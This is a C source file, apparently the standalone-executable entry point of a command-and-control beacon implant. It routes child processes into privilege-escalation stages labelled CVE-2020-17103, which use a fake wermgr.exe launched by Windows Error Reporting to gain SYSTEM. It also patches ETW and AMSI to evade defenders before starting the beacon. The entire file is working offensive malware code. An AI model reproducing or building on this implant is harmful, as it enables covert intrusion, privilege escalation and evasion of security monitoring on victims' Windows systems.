// EXE entry point for the beacon when compiled as a standalone executable.
// No CRT — raw Windows entry point calls beacon_main() directly.

#include "../core/beacon.h"

extern void beacon_main(void);
extern void plasma_stage_entry(int stage);
extern void plasma_system_payload(void);

// Check if running as NT AUTHORITY\SYSTEM
static BOOL pl_check_system(void) {
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return FALSE;
    BYTE buf[256];
    DWORD ret = 0;
    BOOL ok = GetTokenInformation(tok, TokenUser, buf, sizeof(buf), &ret);
    CloseHandle(tok);
    if (!ok) return FALSE;
    TOKEN_USER* tu = (TOKEN_USER*)buf;

    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID sysSid = NULL;
    AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                             0, 0, 0, 0, 0, 0, 0, &sysSid);
    BOOL eq = EqualSid(tu->User.Sid, sysSid);
    FreeSid(sysSid);
    return eq;
}

void BeaconExeEntry(void) {
    bdbg("[beacon] exe_entry: start\n");

    // Check if this is a plasma child process (CVE-2020-17103 privesc stages)
    {
        wchar_t envBuf[8];
        DWORD r = GetEnvironmentVariableW(L"CO2H_PLASMA", envBuf, 8);
        if (r > 0 && r < 8) {
            // 'S' = spawned by SystemPayload → skip SYSTEM check, go to beacon_main
            if (envBuf[0] == L'S') {
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                goto beacon_start;
            }
            int stage = (int)(envBuf[0] - L'0');
            if (stage >= 1 && stage <= 3) {
                SetEnvironmentVariableW(L"CO2H_PLASMA", NULL);
                plasma_stage_entry(stage);
                ExitProcess(0);
            }
        }
    }

    // If running as SYSTEM — try plasma SystemPayload (connect to pipe).
    // If pipe exists (Stage 3 is waiting) → we're the fake wermgr.exe launched by WER.
    // plasma_system_payload spawns a new SYSTEM beacon in user's session and calls
    // ExitProcess — never returns.  If pipe doesn't exist → returns → normal beacon.
    if (pl_check_system()) {
        plasma_system_payload();
        // Reached only if pipe was not available (normal SYSTEM beacon startup).
    }

beacon_start:
#ifdef CO2H_ENABLE_OPSEC
    opsec_patch_etw();
    opsec_patch_amsi();
    bdbg("[beacon] exe_entry: etw/amsi patched\n");
#else
    bdbg("[beacon] exe_entry: opsec patches DISABLED for dev\n");
#endif
    bdbg("[beacon] exe_entry: past opsec patches\n");
    bdbg("[beacon] exe_entry: skipping antidbg for dev\n");
    bdbg("[beacon] exe_entry: entering beacon_main\n");
    beacon_main();
    bdbg("[beacon] exe_entry: ExitProcess\n");
    ExitProcess(0);
}
